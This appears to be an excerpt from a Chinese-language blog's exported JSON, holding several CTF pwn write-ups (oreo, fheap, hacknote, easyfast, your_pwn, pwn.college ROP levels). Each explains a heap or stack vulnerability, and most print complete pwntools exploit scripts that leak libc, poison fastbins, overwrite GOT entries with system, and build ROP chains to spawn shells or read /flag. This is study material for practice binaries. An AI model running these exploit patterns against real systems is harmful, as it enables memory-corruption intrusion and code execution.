name)show_rifle()p.recvuntil(&#x27;===================================\\n&#x27;)p.recvuntil(&#x27;Description: &#x27;)puts_addr = u32(p.recvuntil(&#x27;\\n&#x27;, drop=True)[:4])print(hex(puts_addr)) ​ 然后按套路算出system()的地址。 123libcbase = puts_addr - libc.symbols(&#x27;puts&#x27;)system_addr = libcbase + libc.symbols(&#x27;system&#x27;)log.success(&#x27;system_addr &#x27; + hex(system_addr)) 利用任意地址写覆盖free@got为system_addr​ 刚才说到，我们可以将notice处的指针改为got表地址，为了做到这一点，我们需要在这个地址附近申请一个fake chunkk。 ​ 这里主要利用到了order()函数中的漏洞。虽然free的过程中将ptr置0，但是chunk中还保存着fd。 ​ 最开始有一个简单的想法，就是直接将fd覆盖为got表地址，从而在got表项地址处申请chunk来修改，想法是自然的，然而如果只是单纯地将fd覆盖为free@got，并不能成功地在target addr分配chunk，这是由于分配chunk时的一系列检测。 ​ ​ 如果直接将fd填成free_got_addr，就会造成double free。为什么捏？如果是地址无效我还是能够理解，但是double free我确实不理解。在free了当前chunk之后，fastbin不是应该长这样 》main_arena =&gt; free_got_addr =&gt;chunk0?怎么会有double free呢？ ​ ​ 先不管。 ​ 回到在notice附近构造fake chunk，可以先add一个chunk，并按照之前的方式覆盖fd为notice的地址。这样一来当我们free这个chunk，再add 相同size的chunk时，notice就会被作为fake chunk的ptr，被分配出去。 ​ 当然，为了成功伪造fake chunk，我们至少要将notice的空间添加一些chunk该有的结构，比如说size。以及next chunk的size和prev size。 ​ 为了覆盖got表，user space开始的地址需要是0x804A2A,所以这个chunk的size的地址在0x804A2A4 ​ ​ 可以看到这个地址正好是枪支已经添加的数量，所以为了构造fake chunk的size，我们可以先总共申0x40个枪支，因为之前泄露libc已经申请了一个，所以只需要再申请0x40-1只。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182from pwn import *from LibcSearcher import LibcSearcherlibc = ELF(&quot;/glibc/2.23/32/lib/libc-2.23.so&quot;)context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]context.log_level = &quot;debug&quot;&#x27;&#x27;&#x27;if args[&#x27;REMOTE&#x27;]: p = remote(&quot;node4.buuoj.cn&quot;,27999)else: &#x27;&#x27;&#x27;p = process([&quot;/glibc/2.23/32/lib/ld-2.23.so&quot;,&quot;./oreo&quot;],env=&#123;&quot;LD_PRELOAD&quot; : &quot;/glibc/2.23/32/lib/libc.so.6&quot;&#125;)elf = ELF(&#x27;./oreo&#x27;)strlen_got_addr = elf.got[&#x27;strlen&#x27;]notice_addr = 0x804A2A8free_got_addr = 0x804A238 def add(descrip, name): p.sendline(&#x27;1&#x27;) #p.recvuntil(&#x27;Rifle name: &#x27;) p.sendline(name) #p.recvuntil(&#x27;Rifle description: &#x27;) #sleep(0.5) p.sendline(descrip)def show_rifle(): p.sendline(&#x27;2&#x27;) p.recvuntil(&#x27;===================================\\n&#x27;)def order(): p.sendline(&#x27;3&#x27;)def message(notice): p.sendline(&#x27;4&#x27;) #p.recvuntil(&quot;Enter any notice you&#x27;d like to submit with your order: &quot;) p.sendline(notice)#find libc basename = 27 * b&#x27;a&#x27; + p32(elf.got[&#x27;puts&#x27;])add(25 * b&#x27;a&#x27;, name)show_rifle()p.recvuntil(&#x27;===================================\\n&#x27;)p.recvuntil(&#x27;Description: &#x27;)puts_addr = u32(p.recvuntil(&#x27;\\n&#x27;, drop=True)[:4])log.success(&#x27;puts_addr &#x27; + hex(puts_addr))libcbase = puts_addr - libc.symbols[&#x27;puts&#x27;]system_addr = libcbase + libc.symbols[&#x27;system&#x27;]log.success(&#x27;system_addr &#x27; + hex(system_addr))#overwrite free@gotn = 1while n &lt; 0x3f:# set next link=NULL add(25 * b&#x27;a&#x27;, b&#x27;a&#x27; * 27 + p32(0)) n += 1add(b&#x27;a&#x27;*25,b&#x27;b&#x27;*27+p32(notice_addr))payload = b&#x27;\\x00&#x27;*0x20 +p32(0x40) + p32(0x99)#payload = payload.ljust(52,b&#x27;a&#x27;)payload += p32(0)payload = payload.ljust(128,b&#x27;c&#x27;)message(payload)order()#p.recvuntil(&#x27;Okay order submitted!\\n&#x27;)#modify the strlen_got to systempayload = p32(strlen_got_addr).ljust(20,b&#x27;a&#x27;)add(payload,b&#x27;a&#x27;*20)gdb.attach(p)message(p32(system_addr) + b&#x27;;/bin/sh\\x00&#x27;)p.interactive() ​","categories":[{"name":"HEAP - Fastbin Attack","slug":"HEAP-Fastbin-Attack","permalink":"https://fuurinko.github.io/categories/HEAP-Fastbin-Attack/"}],"tags":[{"name":"UAF","slug":"UAF","permalink":"https://fuurinko.github.io/tags/UAF/"}]},{"title":"xdctf2015_pwn200","slug":"week3-3.1","date":"2022-03-17T06:43:25.178Z","updated":"2022-03-20T04:33:33.017Z","comments":true,"path":"2022/03/17/week3-3.1/","link":"","permalink":"https://fuurinko.github.io/2022/03/17/week3-3.1/","excerpt":"","text":"xdctf2015_pwn200​ ​ 练习一下DynELF。 ​ 看起来像ret2csu+DynELF。 ​ 没啥好分析的，溢出112,然后直接写leak函数。 1234567891011121314151617def leak(addr): payload = b&#x27;a&#x27;*offset payload += p32(write_plt) payload += p32(ret_addr) payload += p32(1) payload += p32(addr) payload += p32(4) p.send(payload) data = p.recv() log.info(&quot;leaking: 0x%x --&gt; %s&quot; % (addr, (data or &#x27;&#x27;).encode(&#x27;hex&#x27;))) return datad = DynELF(leak,elf = elf)system_addr = d.lookup(&#x27;system&#x27;,&#x27;libc&#x27;)log.info(&quot;system address: 0x%x&quot; % system_addr) ​ ​ 一般来说这个模块的利用就是通过stdout的函数来泄露某个地址，然后再暴力寻找，相对普通的ret2libc其实更为方便快捷，我不知道为什么感觉用的人很少。 ps：关于整体布栈还是有一些小的疑问。","categories":[{"name":"STACK - DynELF","slug":"STACK-DynELF","permalink":"https://fuurinko.github.io/categories/STACK-DynELF/"}],"tags":[{"name":"DynELF","slug":"DynELF","permalink":"https://fuurinko.github.io/tags/DynELF/"}]},{"title":"DynELF学习","slug":"stack_learning_DynELF","date":"2022-03-16T14:06:44.306Z","updated":"2022-10-24T01:37:04.484Z","comments":true,"path":"2022/03/16/stack_learning_DynELF/","link":"","permalink":"https://fuurinko.github.io/2022/03/16/stack_learning_DynELF/","excerpt":"","text":"0​ 我发现我居然还不太会用这个东西，可以用不上，但是不能不会。 1​ DynELF的意义在于当我们无法找到目标libc中具体的符号偏移时，可以利用它来搜索内存中的函数地址,而不需要再通过libc来获取。 如何使用？1234567891011121314151617181920212223242526272829303132333435p = process(&#x27;./pwnme&#x27;)# Declare a function that takes a single address, and# leaks at least one byte at that address.def leak(address): data = p.read(address, 4) log.debug(&quot;%#x =&gt; %s&quot; % (address, (data or &#x27;&#x27;).encode(&#x27;hex&#x27;))) return data# For the sake of this example, let&#x27;s say that we# have any of these pointers. One is a pointer into# the target binary, the other two are pointers into libcmain = 0xfeedf4celibc = 0xdeadb000system = 0xdeadbeef# With our leaker, and a pointer into our target binary,# we can resolve the address of anything.## We do not actually need to have a copy of the target# binary for this to work.d = DynELF(leak, main)assert d.lookup(None, &#x27;libc&#x27;) == libcassert d.lookup(&#x27;system&#x27;, &#x27;libc&#x27;) == system# However, if we *do* have a copy of the target binary,# we can speed up some of the steps.d = DynELF(leak, main, elf=ELF(&#x27;./pwnme&#x27;))assert d.lookup(None, &#x27;libc&#x27;) == libcassert d.lookup(&#x27;system&#x27;, &#x27;libc&#x27;) == system# Alternately, we can resolve symbols inside another library,# given a pointer into it.d = DynELF(leak, libc + 0x1234)assert d.lookup(&#x27;system&#x27;) == system ​ ​ 大致描述一下，就是先用leak()函数按照原本ret2xx的方法用stdout函数来打印addr的数据，然后 12d = DynELF(leak, main)system_addr = d.lookup(&#x27;system&#x27;, &#x27;libc&#x27;) ​ 来找到system的地址。 原理？​ 这个module其实非常好用，指不知道原理也能用。 ​ DynELF泄露地址的过程原理通常分为两步，首先通过暴力对比找到libc的内存加载基址。 ​ 在找libc之前还需要找到elf文件在内存中的加载基址。 寻找elf文件加载基址​ 基地址内存页起始的字符串为\\0x7fELF，所以可以指定内存中的地址，然后对地址进行页对齐，再与当前内存页起始字符串进行对比，如果不符合则不断与更低地址内存页的起始字符串对比，直到找到。 寻找glibc加载基址​ efl在内存中有一个叫做link_map的双向链表，在学习ret2dl的时候遇见过，大致是指向elf的一些表项相关数据结构的链表。 ​ 对于如何找到link_map ,一般来说有两种方式，在full relro以外的elf中，可以在Dynamic段的.got.plt节中找到，对于启用full relro的elf，可以在Dynamic段的DT_DEBUG中找到。 ​ Dynamic段的地址则需要通过ELF文件的段表得到，由于我们已经获得了ELF的内存基地址，所以也能得到段表的地址。 在libc中寻找hash表，动态符号表与字符串表基地址​ 通过上面两步我们已经获得了libc的基地址，因此很容易得到所有与函数相关的hash表，动态符号表以及字符串表的基地址。最后，可以通过hash表得到system的地址。 ​ 参考​ Pwntools之DynELF原理探究 ​ ​ Finding Function’s Load Address","categories":[{"name":"STACK - DynELF","slug":"STACK-DynELF","permalink":"https://fuurinko.github.io/categories/STACK-DynELF/"}],"tags":[{"name":"mess","slug":"mess","permalink":"https://fuurinko.github.io/tags/mess/"}]},{"title":"ccmc_pwnme2","slug":"week3-2.2","date":"2022-03-16T11:18:25.856Z","updated":"2022-03-25T11:58:03.866Z","comments":true,"path":"2022/03/16/week3-2.2/","link":"","permalink":"https://fuurinko.github.io/2022/03/16/week3-2.2/","excerpt":"","text":"​ ccmc_pwnme2一道看起来人畜无害的栈题。但是有几个非常奇怪的函数。 ​ 所以这是一道相对有些奇怪的rop，控制这三个函数的其中两个的参数为指定字符串，就能较为方便地读取flag。 12345678910111213141516from pwn import *p = remote(&#x27;node4.buuoj.cn&#x27;,27653)#p = process(&#x27;./pwnme2&#x27;)pop_edi_ebp_ret= 0x0804867fpop_ebp_ret = 0x08048680add_home = 0x08048644add_flag = 0x08048682exec_string = 0x080485CBpayload = b&quot;a&quot;*112 + p32(add_home) + p32(pop_ebp_ret) + p32(0xDEADBEEF) payload += p32(add_flag) + p32(pop_edi_ebp_ret) + p32(0xCAFEBABE) + p32(0xABADF00D) payload += p32(exec_string)p.send(payload)p.interactive() ​ ​ ps：感觉还需要再多做一些rop","categories":[{"name":"STACK - Stack Overflow","slug":"STACK-Stack-Overflow","permalink":"https://fuurinko.github.io/categories/STACK-Stack-Overflow/"}],"tags":[{"name":"ret2gadgets","slug":"ret2gadgets","permalink":"https://fuurinko.github.io/tags/ret2gadgets/"}]},{"title":"hctf2016_fheap","slug":"week3-2.1","date":"2022-03-16T03:48:29.784Z","updated":"2022-03-25T11:55:48.766Z","comments":true,"path":"2022/03/16/week3-2.1/","link":"","permalink":"https://fuurinko.github.io/2022/03/16/week3-2.1/","excerpt":"","text":"​ ​ 第三周第二天第一道堆题。应该是一道中等偏下的fastbinattack。 ​ libc是2.23。 ​ ​ 保护全开，pie是个麻烦点。 ​ 逆向一下，这个程序的逻辑不算很复杂，但是也需要逆清楚。 ​ ​ 程序在ptr+3的地方保存了一个有着free函数功能的指针，并且当delete str时，也是调用这个指针，而不是free函数本身，所以可以覆盖它为任意函数指针。 ​ 为了泄露内存，我们可以尝试调用printf，并构造格式化字符串，找到system的地址，然后可以故技重施，将指针覆盖为system，从而getshell。 ​ 所以利用的第一步就是覆盖这个free指针为printf指针，由于程序开启了pie，我们只需要，也只能覆盖指针的最后两个字节。 ​ 对于格式化字符串，（其实我不太会》〉》〉这两天多刷一些吧，目前就copy一下大佬的exp） 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253from pwn import *libc = ELF(&quot;/glibc/2.23/64/lib/libc-2.23.so&quot;)context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]context.log_level = &quot;debug&quot;&#x27;&#x27;&#x27;if args[&#x27;REMOTE&#x27;]: p = remote(&quot;node4.buuoj.cn&quot;,27999)else: &#x27;&#x27;&#x27;r = process([&quot;/glibc/2.23/64/lib/ld-2.23.so&quot;,&quot;./pwn-f&quot;],env=&#123;&quot;LD_PRELOAD&quot; : &quot;/glibc/2.23/64/lib/libc.so.6&quot;&#125;)def add(size,content): r.recvuntil(&quot;3.quit&quot;) r.sendline(&quot;create &quot;) r.recvuntil(&quot;Pls give string size:&quot;) r.sendline(str(size)) r.recvuntil(&quot;str:&quot;) r.sendline(str(content))def free(idx): r.recvuntil(&quot;3.quit&quot;) r.sendline(&quot;delete &quot;) r.recvuntil(&quot;id:&quot;) r.sendline(str(idx)) r.recvuntil(&quot;Are you sure?:&quot;) r.sendline(&quot;yes&quot;)add(10,&quot;aaaa&quot;)#chunk0(0x20)add(10,&quot;bbbb&quot;)#chunk1(0x20)free(1)#main_arena =&gt; chunk1free(0)#main_arena=&gt; chunk0 =&gt; chunk1add(25,b&#x27;Start%176$pEnd&#x27;.ljust(24,b&#x27;a&#x27;) + b&#x27;\\xb6&#x27;)#chukn2 ,point to chunk0free(1)#print chunkr.recvuntil(&quot;Start&quot;)libc_start_main = u64(r.recvline(&quot;END&quot;,drop = True))print(hex(libc_start_main))libc_base = libc_start_main - libc.symbols[__libc_start_main]system_addr = libc_base + libc.symbols[system]free(0)add(32,b&quot;/bin/sh;&quot;.ljust(24,b&#x27;a&#x27;) + p64(system_addr))free(1)r.interactive() ​","categories":[{"name":"HEAP - Fastbin Attack","slug":"HEAP-Fastbin-Attack","permalink":"https://fuurinko.github.io/categories/HEAP-Fastbin-Attack/"}],"tags":[{"name":"UAF","slug":"UAF","permalink":"https://fuurinko.github.io/tags/UAF/"}]},{"title":"lab 10 hacknote","slug":"week3-1.2","date":"2022-03-15T13:34:53.564Z","updated":"2022-04-13T16:42:58.481Z","comments":true,"path":"2022/03/15/week3-1.2/","link":"","permalink":"https://fuurinko.github.io/2022/03/15/week3-1.2/","excerpt":"","text":"​ 这个题已经做过好多遍了orz，因为不断的摆烂然后复健…..每次又是做这道 ​ 逆一下。 ​ 话说可以总结一下类似的题目的快速逆向方法。比如说一般肯定会定义一个结构体，结构体中包含比如content和指针的字段，然后如果有可以利用的uaf或者double free的话，就可以覆盖结构体中保存的指针字段，从而进一步攻击。 ​ 回到这道题，这里的结构体包含两个字段，一个是 print_note_content这个函数的地址，另外一个是结构体的content。 随便申请一个note，chunk布局长这样（因为是32位的程序，所以显示上有些bug，但不影响） ​ 0x804865b就是print_note_content函数的地址，然后前面一个估计是堆上的地址。 12if ( *(&amp;notelist + v1) ) (*(void (__cdecl **)(_DWORD))*(&amp;notelist + v1))(*(&amp;notelist + v1)); ​ 接着如果put note，这个print函数就会调用这个print note字段。所以利用思路就是利用UAf然后修改chunk中print note字段的地址为magic()的地址，然后再尝试puts此chunk，就相当于调用了magic()。 ​ 但是由于程序并没有直接给出edit的功能，我们需要想办法在合适位置构建fake chunk，使得chunk的print字段正好处于我们可以任意写入内容的fake chunk的content字段。 ​ 需要注意的就是free note的过程是分别按顺序先释放content chunk再释放put chunk，并且两个chunk的size不同，fastbin链表的种类也不同，分配的顺序也不同。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657from pwn import *#libc = ELF(&quot;/glibc/2.23/32/lib/libc-2.23.so&quot;)context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]context.log_level = &quot;debug&quot;&#x27;&#x27;&#x27;if args[&#x27;REMOTE&#x27;]: p = remote(&quot;node4.buuoj.cn&quot;,27999)else: &#x27;&#x27;&#x27;p = process([&quot;/glibc/2.23/32/lib/ld-2.23.so&quot;,&quot;./hacknote&quot;],env=&#123;&quot;LD_PRELOAD&quot; : &quot;/glibc/2.23/32/lib/libc.so.6&quot;&#125;)#p = process(&#x27;./&#x27;)magic = 0x08048986def add(size,content): p.recvuntil(&quot;Your choice :&quot;) p.sendline(&#x27;1&#x27;) p.recvuntil(&#x27;Note size :&#x27;) p.sendline(str(size)) p.recvuntil(&quot;Content :&quot;) p.send(content)def free(idx): p.recvuntil(&quot;Your choice :&quot;) p.sendline(&#x27;2&#x27;) p.recvuntil(&#x27;Index :&#x27;) p.sendline(str(idx))def put(idx): p.recvuntil(&quot;Your choice :&quot;) p.sendline(&#x27;3&#x27;) p.recvuntil(&#x27;Index :&#x27;) p.sendline(str(idx))add(0x20,b&quot;a&quot;*0x8)#chunk0 [chunk0_print(0x10),chunk0_content(0x20)]add(0x20,b&quot;a&quot;*0x8)#chunk1 [chunk0_print(0x10),chunk0_content(0x20)]free(1)#main_arena 0x10:=&gt; chunk1_print(0x10) # 0x20:=&gt; chunk1_content(0x20)free(0)#main_arena 0x10:=&gt; chunk0_print(0x10) =&gt; chunk1_print(0x10) # 0x20: =&gt; chunk0_content(0x20)=&gt; chunk1_content(0x20)&#x27;&#x27;&#x27;fastbin:main_arena =&gt; chunk1_print(0x10) =&gt; chunk0_print(0x10) main_arena =&gt; chunk1_content(0x20) =&gt; chunk0_content(0x20)&#x27;&#x27;&#x27;add(0x8,p32(magic)*2)#chunk2, point to chunk0_print(0x10) and chunk1_print(0x10)put(1)gdb.attach(p)p.interactive() ​ ​ ​ 这个高亮怎么这么怪，为什么多行注释当作字符串处理了啊。 ​ ​","categories":[{"name":"HEAP - Fastbin Attack","slug":"HEAP-Fastbin-Attack","permalink":"https://fuurinko.github.io/categories/HEAP-Fastbin-Attack/"}],"tags":[{"name":"UAF","slug":"UAF","permalink":"https://fuurinko.github.io/tags/UAF/"}]},{"title":"wustctf2020_easyfast","slug":"week3-1.1","date":"2022-03-15T07:37:41.226Z","updated":"2022-03-20T04:33:25.762Z","comments":true,"path":"2022/03/15/week3-1.1/","link":"","permalink":"https://fuurinko.github.io/2022/03/15/week3-1.1/","excerpt":"","text":"2022-3-15 wustctf2020_easyfastchecksec : ​ 简单逆向一下，有后门函数，当这个地址上储存的数小于等于0时getshell。整体的程序的话是一个没什么特别的菜单，free处有uaf，edit处能对堆指针任意写。 ​ 首先逆向以后大体的思路是利用这个UAF进行0x602090的地址处的覆盖。 ​ 所以我们需要构造chunk pointer为0x602080的fake chunk，使得对应的用户空间可以被写为0。这里就可以用到edit的任意写功能，将某个chunk的fd覆盖为0x602080，使得下一次申请到该地址的chunk。 ​ 首先add再free两个chunk。 稍微有一个要注意的就是 这个地址是我们fake chunk的size位，也就是说明这个chunk申请时应该为0x40。也就是所有chunk都应该是0x40大小。 1234add(0x40)add(0x40)free(0)free(1) ​ 然后再将此时先被free的chunk的fd覆盖为0x602080 ​ ​ 此时连续add三个chunk，第三个就是我们需要的地址了 12345678910111213141516171819202122232425262728293031323334353637383940414243444546from pwn import *libc = ELF(&quot;/glibc/2.23/64/lib/libc-2.23.so&quot;)context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]context.log_level = &quot;debug&quot;if args[&#x27;REMOTE&#x27;]: p = remote(&quot;node4.buuoj.cn&quot;,27982)else: p = process([&quot;/glibc/2.23/64/lib/ld-2.23.so&quot;,&quot;./wustctf2020_easyfast&quot;],env=&#123;&quot;LD_PRELOAD&quot; : &quot;/glibc/2.23/64/lib/libc.so.6&quot;&#125;)def cmd(idx): p.recvuntil(&#x27;choice&gt;&#x27;) p.sendline(str(idx))def add(size): cmd(1) p.recvuntil(&#x27;size&gt;&#x27;) p.sendline(str(size))def free(idx): cmd(2) p.recvuntil(&#x27;index&gt;&#x27;) p.sendline(str(idx))def edit(idx,content): cmd(3) p.recvuntil(&#x27;index&gt;&#x27;) p.sendline(str(idx)) p.sendline(content) add(0x40)add(0x40)free(0)free(1)gdb.attach(p)edit(0,p64(0x602080))add(0x40)add(0x40)add(0x40)edit(3,p64(0))p.sendafter(&quot;choice&gt;\\n&quot;,&quot;4&quot;)p.interactive() 总结​ 其实没有什么好总结的，这算是最水的一类堆题了，纯粹是太久没有做复健一下，一晚上能做三四道。","categories":[{"name":"HEAP - Fastbin Attack","slug":"HEAP-Fastbin-Attack","permalink":"https://fuurinko.github.io/categories/HEAP-Fastbin-Attack/"}],"tags":[{"name":"UAF","slug":"UAF","permalink":"https://fuurinko.github.io/tags/UAF/"}]},{"title":"2019_your_pwn","slug":"ciscn_2019_your_pwn","date":"2022-03-14T10:30:34.805Z","updated":"2022-04-07T12:38:13.552Z","comments":true,"path":"2022/03/14/ciscn_2019_your_pwn/","link":"","permalink":"https://fuurinko.github.io/2022/03/14/ciscn_2019_your_pwn/","excerpt":"","text":"console.error(\"ReferenceError: value is not defined\"); ​ 因为是数组越界，每次只能读取一个字节，所以脚本需要循环，首先计算出偏移获取函数的地址，一般来说比较常规的思路是拿libc_start_main ,只是这里的偏移比较远。 ​ ps： 关于如何在看起来比较混乱的栈中找到偏移量这件事 ​ 首先要搞清楚函数逻辑，就是不管有多简单也不能想当然的那种搞清楚。 ​ 这里一共有三个关键的变量，v4，idx和v2，idx是v4数组的索引，用来leak地址。v2用来填content，最后把v2赋给v4[idx]。 ​ 所以在地址上索引的地址和内容是不完全连续的。 ​ ​ 这里2e0是输入的idx，568是需要被泄露的地址，大致的索引应该是648左右，更精确的需要调试得出。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455from pwn import*#from LibcSearcher import LibcSearchercontext.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]#context.log_level = &quot;debug&quot;if args[&#x27;REMOTE&#x27;]: p = remote()else: p = process(&#x27;./pwn&#x27;)elf = ELF(&quot;./pwn&quot;)libc = ELF(&#x27;./libc-2.23.so&#x27;)libc_start_main = &#x27;&#x27;one_gadget = 0x45216p.sendafter(&#x27;name&#x27;,&#x27;aa&#x27;)for i in range(638,632,-1): p.recvuntil(&#x27;index\\n&#x27;) p.sendline(str(i)) p.recvuntil(&#x27;(hex) &#x27;) xx = p.recvuntil(&#x27;\\n&#x27;)[:-1] p.recvuntil(&#x27;value\\n&#x27;) p.sendline(&#x27;1&#x27;) if(len(xx)&lt;2): libc_start_main += &#x27;0&#x27; + xx elif(len(xx)==8): libc_start_main += xx[-2:] else: libc_start_main += xx&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;print(hex(libc_start_main))libc_start_main = int(&#x27;0x&#x27; + libc_start_main,16)libc_base = libc_start_main-libc.symbols[&#x27;__libc_start_main&#x27;]print(hex(libc.symbols[&#x27;__libc_start_main&#x27;]))print(hex(libc_base))one_gadget += libc_base for i in range(6): p.recvuntil(&#x27;index\\n&#x27;) p.sendline(str(344+i)) p.recvuntil(&#x27;value\\n&#x27;) p.sendline(str(ord(p64(one_gadget)[i])))p.interactive()","categories":[{"name":"STACK - ARRAY OUT OF BOUNDS","slug":"STACK-ARRAY-OUT-OF-BOUNDS","permalink":"https://fuurinko.github.io/categories/STACK-ARRAY-OUT-OF-BOUNDS/"}],"tags":[{"name":"cisin","slug":"cisin","permalink":"https://fuurinko.github.io/tags/cisin/"}]},{"title":"pwn中的python字符串处理问题","slug":"mess_pwn中的python字符串处理问题","date":"2022-03-12T02:50:45.551Z","updated":"2022-10-24T12:40:20.164Z","comments":true,"path":"2022/03/12/mess_pwn中的python字符串处理问题/","link":"","permalink":"https://fuurinko.github.io/2022/03/12/mess_pwn%E4%B8%AD%E7%9A%84python%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%A4%84%E7%90%86%E9%97%AE%E9%A2%98/","excerpt":"","text":"​ 最近在pwncollege做题的时候常常遇到接收的字符串处理不当的问题，故总结整理一下。 字符串截取123456789p.recv()[0:6] #截取1-5个字符串p.recv()[2:6] #截取2-5个字符串p.recv()[:] #截取完整字符串p.recv()[2:]#从第二个索引开始截取p.recv()[-4:]#截取最后四个字符 ​ 字符串处理​ 一般来说我们接收到的数据是字符串的字节流，然后利用pwntools的unpack module来转换为int型。并且 ​ 所以一般来说这样的payload是不会出问题的。 1canary = u64(p.recv()[41:49]) ​ ​ 所以当接收到类似以下的报错： ​ ​ 很大概率并不是数据类型转换的问题，而是本身接收的数据存在问题，比如说接收的数据范围错了，或者根本就没有有效的数据。这个时候关注的重点应该是payload的逻辑本身而不是语法问题。 ​","categories":[{"name":"MESS","slug":"MESS","permalink":"https://fuurinko.github.io/categories/MESS/"}],"tags":[{"name":"mess","slug":"mess","permalink":"https://fuurinko.github.io/tags/mess/"}]},{"title":"ROP","slug":"pwn.college_ROP","date":"2022-03-10T14:12:38.052Z","updated":"2022-03-20T04:32:51.850Z","comments":true,"path":"2022/03/10/pwn.college_ROP/","link":"","permalink":"https://fuurinko.github.io/2022/03/10/pwn.college_ROP/","excerpt":"","text":"写在前面：如果是普通的环境，运行程序可能需要capstone，可以直接在官网下载源码编译，然后将编译好的动态链接库cp到lib里 cp libcapstone.so.5 /lib/x86_64-linux-gnu/ Level1​ 最最最基础的rop了，和前前一个module的前面的有个level一模一样。 1234567891011121314from pwn import*#context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]#context.log_level = &quot;debug&quot;p = process(&quot;/challenge/babyrop_level1.0&quot;)win = 0x401b56payload = b&quot;a&quot;*104 + p64(win)p.send(payload)p.interactive() Level2123456789101112131415from pwn import*#context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]#context.log_level = &quot;debug&quot;p = process(&quot;/challenge/babyrop_level2.0&quot;)win1 = 0x4022EEwin2 = 0x40239Bpayload = b&quot;a&quot;*88 + p64(win1) + p64(win2)p.send(payload)p.interactive() Level3​ 从这个level差不多沾了一些rop的边了，需要利用ROPgadget来寻找对应的gadget ​ 12345678910111213141516171819202122232425from pwn import*#context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]#context.log_level = &quot;debug&quot;p = process(&quot;/challenge/babyrop_level3.0&quot;)win1 = 0x40275Awin2 = 0x402836win3 = 0x402678win4 = 0x402592win5 = 0x402916rdi = 0x402d03payload = b&quot;a&quot;*72 payload += p64(rdi) + p64(1) + p64(win1)payload += p64(rdi) + p64(2) + p64(win2)payload += p64(rdi) + p64(3) + p64(win3)payload += p64(rdi) + p64(4) + p64(win4)payload += p64(rdi) + p64(5) + p64(win5)p.send(payload)p.interactive() ​ Level4​ ​ rop，ret2syscall。 ​ 这道题其实方法有很多，但是由于栈的空间相对比较小，所以官方给出的做法反而是最聪明也是最实际的。 （因为如果要orw或者getshell的话似乎还要栈迁移） 12process.write(b&#x27;/flag\\0&#x27;.ljust(88,b&#x27;a&#x27;) + pwn.p64(pop_rax.address)+pwn.p64(90) + pwn.p64(pop_rdi.address)+pwn.p64(input) ...: + pwn.p64(pop_rsi.address) + pwn.p64(0o777) + pwn.p64(syscall.address)) 我魔怔了 顺便附一个拿input地址有问题的exp（其实我怀疑gadget的地址也有问题，但是懒得改了） 12345678910111213141516171819202122232425262728from pwn import*context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]context.log_level = &quot;debug&quot;p = process(&quot;./babyrop_level4.0&quot;)syscall = 0x401a69pop_rdi_ret = 0x401492pop_rax_ret = 0x401a91pop_rsi_ret = 0x401a71p.recvuntil(&quot;[LEAK] Your input buffer is located at: &quot;)input = u64(p.recv()[:12])gdb.attach(p)print(input)payload = b&quot;/flag\\0&quot;.ljust(88,b&#x27;a&#x27;) payload += p64(pop_rax_ret) + p64(90)payload += p64(pop_rdi_ret) + p64(input)payload += p64(pop_rsi_ret) + p64(0o777)payload += p64(syscall)p.send(payload)p.interactive() level5​ 这个题也蛮魔怔，和上一个level没有什么区别，但是没有print input buffer，对于我来说也差不多，但是就相对更麻烦了。 ​","categories":[{"name":"PWN.COLLEGE","slug":"PWN-COLLEGE","permalink":"https://fuurinko.github.io/categories/PWN-COLLEGE/"}],"tags":[{"name":"pwncollege","slug":"pwncollege","permalink":"https://fuurinko.github.io/tags/pwncollege/"}]},{"title":"MemoryErrors","slug":"pwn.college_MemoryErrors","date":"2022-03-03T03:18:50.193Z","updated":"2022-10-24T12:47:24.332Z","comments":true,"path":"2022/03/03/pwn.college_MemoryErrors/","link":"","permalink":"https://fuurinko.github.io/2022/03/03/pwn.college_MemoryErrors/","excerpt":"","text":"​ 视频主要介绍了栈溢出及其保护。保护的绕过包括canary和pie，并没有提到NX（那个似乎在后面一个module） ​ 传输题目到本地可以使用scp命令。 1scp -i key -r hacker@dojo.pwn.college:/challenge/babymem_level4.1 /Users/rin/ctf/pwn/pwn_college/MemoryErrors Level1.0​ 随便溢，覆盖掉变量就行。 Level1.1​ 随便溢。 Level2..0​ 随便溢。 level2.1​ 这道题理论上也是需要溢出到v9，但是很奇怪。多试几次会发现溢出得足够大的时候就会有flag了，这里溢出0x1000个就行。 ​ 关于为什么要溢出那么多：我找了很久也没有找到第二次输入的时候缓冲区的地址，大概是利用到了堆内存。 Level3.0​ 没啥好说的。 123456789101112131415from pwn import*p = process(&quot;/challenge/babymem_level3.0&quot;)win_addr = 0x4019fapayload = &quot;a&quot;*152 + p64(win_addr)p.recvuntil(&quot;Payload size:&quot;)p.sendline(&quot;160&quot;)p.recvuntil(&quot;!&quot;)p.sendline(payload)p.recv()p.interactive() ​ Level3.112345678910111213141516171819from pwn import*#context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]context.log_level = &quot;debug&quot;#p = process(&quot;./babymem_level3.1&quot;)p = process(&quot;/challenge/babymem_level3.1&quot;)win_addr = 0x401D35payload = b&quot;a&quot;*105 + p64(win_addr)p.send(b&quot;115&quot;)#gdb.attach(p)p.send(payload)p.interactive() ​ 为什么偏移量这么难找。 Level4.0​ 这个题也是蛮灵性的，只能最多输入18个字符但是溢出量是40。 ​ 注意到实际上程序对于第一次输入的size是没有很严格检测的，所以我们可以输入任意小于18的数字，比如负数。并且负责控制输入size的实际上是一个无符号整数。 